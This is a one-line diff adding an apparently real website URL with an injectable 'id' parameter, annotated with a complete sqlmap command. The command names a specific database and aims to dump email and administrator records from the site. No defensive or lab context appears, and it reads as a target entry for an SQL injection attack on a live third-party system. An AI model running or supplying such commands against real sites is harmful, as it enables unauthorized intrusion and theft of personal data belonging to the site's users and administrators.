@@ -1,0 +1,1 @@
+https://www.bible-history.com/subcat.php?id=2 (GET)  # sqlmap.py -u https://www.bible-history.com/subcat.php?id=2 -D bible_history -T Emails,administrators -C email_id,id --dump
